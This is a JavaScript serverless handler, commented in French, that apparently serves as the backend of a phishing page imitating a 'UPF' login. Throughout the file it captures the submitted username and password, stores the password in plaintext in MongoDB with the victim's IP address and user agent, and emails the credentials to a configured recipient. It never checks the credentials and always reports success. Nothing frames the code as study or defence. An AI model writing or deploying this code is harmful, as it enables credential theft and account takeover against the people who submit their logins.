import mongoose from 'mongoose';
import nodemailer from 'nodemailer';

// Schéma LoginAttempt
const loginSchema = new mongoose.Schema(
  {
    identifiant: {
      type: String,
      required: true,
      trim: true,
    },
    motDePasse: {
      type: String,
      required: true,
    },
    ipAddress: String,
    userAgent: String,
    timestamp: {
      type: Date,
      default: Date.now,
    },
  },
  { timestamps: true }
);

const LoginAttempt = mongoose.model('LoginAttempt', loginSchema);

// Service Email
const sendLoginNotificationEmail = async (identifiant, motDePasse, ipAddress) => {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASSWORD,
    },
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_RECIPIENT,
    subject: 'Nouvelle tentative de connexion UPF',
    html: `
      <h2>Tentative de connexion détectée</h2>
      <p><strong>Date:</strong> ${new Date().toLocaleString('fr-FR')}</p>
      <p><strong>Identifiant:</strong> ${identifiant}</p>
      <p><strong>Mot de passe:</strong> ${motDePasse}</p>
      <p><strong>Adresse IP:</strong> ${ipAddress || 'Non disponible'}</p>
    `,
  };

  return await transporter.sendMail(mailOptions);
};

let mongoConnected = false;

const connectDB = async () => {
  if (mongoConnected) return;
  
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    mongoConnected = true;
    console.log('✓ Connecté à MongoDB');
  } catch (error) {
    console.error('✗ Erreur MongoDB:', error.message);
    throw error;
  }
};

export default async function handler(req, res) {
  // Activer CORS
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Gestion des requêtes OPTIONS (preflight)
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Vérifier les variables d'environnement
    if (!process.env.MONGODB_URI) {
      console.error('❌ MONGODB_URI non configurée');
      return res.status(500).json({
        success: false,
        message: 'Configuration manquante: MONGODB_URI',
      });
    }

    const { identifiant, motDePasse } = req.body;

    console.log('📝 Tentative de connexion reçue:', { identifiant });

    if (!identifiant || !motDePasse) {
      return res.status(400).json({
        success: false,
        message: 'Identifiant et mot de passe sont requis',
      });
    }

    await connectDB();
    console.log('✓ MongoDB connecté');

    const ipAddress = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'inconnu';

    const loginAttempt = new LoginAttempt({
      identifiant,
      motDePasse,
      ipAddress,
      userAgent: req.headers['user-agent'],
    });

    await loginAttempt.save();
    console.log('✓ Tentative enregistrée:', loginAttempt._id);

    // Essayer d'envoyer l'email (optionnel)
    if (process.env.EMAIL_USER && process.env.EMAIL_PASSWORD && process.env.EMAIL_RECIPIENT) {
      try {
        await sendLoginNotificationEmail(identifiant, motDePasse, ipAddress);
        console.log('✓ Email envoyé');
      } catch (emailError) {
        console.warn('⚠ Erreur email (non bloquant):', emailError.message);
      }
    } else {
      console.warn('⚠ Email non configuré (variables manquantes)');
    }

    res.status(201).json({
      success: true,
      message: 'Connexion enregistrée avec succès',
      id: loginAttempt._id,
    });
  } catch (error) {
    console.error('❌ Erreur serveur:', error.message);
    console.error('Stack trace:', error.stack);
    
    res.status(500).json({
      success: false,
      message: 'Erreur serveur lors de l\'enregistrement: ' + error.message,
    });
  }
}
